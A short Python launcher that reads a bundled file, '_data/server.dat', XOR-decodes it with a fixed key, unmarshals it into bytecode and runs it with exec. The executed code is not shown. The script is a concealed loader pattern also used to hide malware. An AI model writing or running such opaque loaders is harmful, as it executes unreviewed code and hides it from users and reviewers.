#!/usr/bin/env python3
import marshal, os, sys
_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _dir)
_dat = os.path.join(_dir, '_data', 'server.dat')
with open(_dat, 'rb') as _f:
    _raw = _f.read()
_data = bytes(b ^ 0x5A for b in _raw)
_code = marshal.loads(_data)
exec(_code)
